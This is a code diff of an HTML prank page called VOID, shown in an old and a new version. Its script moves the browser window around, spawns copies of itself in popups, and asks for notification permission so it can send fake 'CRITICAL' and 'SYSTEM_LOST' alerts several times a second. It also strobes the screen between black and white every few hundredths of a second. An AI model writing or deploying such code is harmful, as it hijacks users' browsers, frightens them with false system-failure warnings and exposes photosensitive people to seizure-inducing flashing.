@@ -1,63 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VOID_REPLICATOR</title>
-    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
+    <title>VOID</title>
     <style>
-        body { background: #000; margin: 0; overflow: hidden; height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center; }
-        #glitch { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; animation: flash 0.04s infinite; }
-        @keyframes flash { 0% { background: #fff; } 50% { background: #000; } 100% { background: #444; } }
-        button { position: relative; z-index: 10; padding: 20px; font-family: monospace; font-weight: bold; cursor: pointer; }
+        body { background: #000; margin: 0; overflow: hidden; animation: flash 0.02s infinite; }
+        @keyframes flash { 0% { background: #fff; } 50% { background: #000; } }
     </style>
 </head>
-<body onload="init()">
-
-    <div id="glitch"></div>
-    <button id="authBtn" onclick="enableSpam()">ACTIVATE PROTOCOL</button>
-
+<body onload="chaos()">
     <script>
-        let x = Math.random() * (screen.availWidth - 400);
-        let y = Math.random() * (screen.availHeight - 400);
-        let dx = 10, dy = 10;
+        let x = Math.random() * (screen.availWidth - 300);
+        let y = Math.random() * (screen.availHeight - 300);
+        let dx = 35, dy = 35; // Extreme speed
 
-        function init() {
-            // 1. BOUNCING
+        function chaos() {
+            // Bouncing
             setInterval(() => {
                 x += dx; y += dy;
-                if (x + 400 > screen.availWidth || x < 0) dx = -dx;
-                if (y + 400 > screen.availHeight || y < 0) dy = -dy;
+                if (x + 300 > screen.availWidth || x < 0) dx = -dx;
+                if (y + 300 > screen.availHeight || y < 0) dy = -dy;
                 window.moveTo(x, y);
-            }, 30);
+            }, 10);
 
-            // 2. ICON GLITCH
-            setInterval(() => {
-                const p = () => Math.floor(Math.random() * 100);
-                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
-            }, 50);
+            // Replicate
+            setTimeout(() => {
+                window.open('notifacations.html', '_blank', 'width=300,height=300');
+            }, 500);
 
-            // 3. REPLICATION (The "Open Again" Logic)
-            // This window will spawn a new copy of itself every 2 seconds
-            setInterval(() => {
-                const newX = Math.random() * (screen.availWidth - 400);
-                const newY = Math.random() * (screen.availHeight - 400);
-                window.open('notifacations.html', '_blank', `width=400,height=400,left=${newX},top=${newY}`);
-            }, 2000); 
-        }
-
-        // 4. NOTIFICATION SPAMMER
-        const lexicon = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST"];
-        async function enableSpam() {
-            const permission = await Notification.requestPermission();
-            if (permission === 'granted') {
-                document.getElementById('authBtn').style.display = 'none';
-                setInterval(() => {
-                    let sentence = "";
-                    for(let i=0; i < (Math.floor(Math.random()*10)+1); i++) {
-                        sentence += lexicon[Math.floor(Math.random() * lexicon.length)] + " ";
-                    }
-                    new Notification("CRITICAL", { body: sentence.trim(), silent: true });
-                }, 1000);
-            }
+            // Spam Notifications
+            Notification.requestPermission().then(p => {
+                if(p === 'granted') {
+                    setInterval(() => {
+                        new Notification("CRITICAL", { body: "SYSTEM_LOST", silent: true });
+                    }, 200);
+                }
+            });
         }
     </script>
 </body>
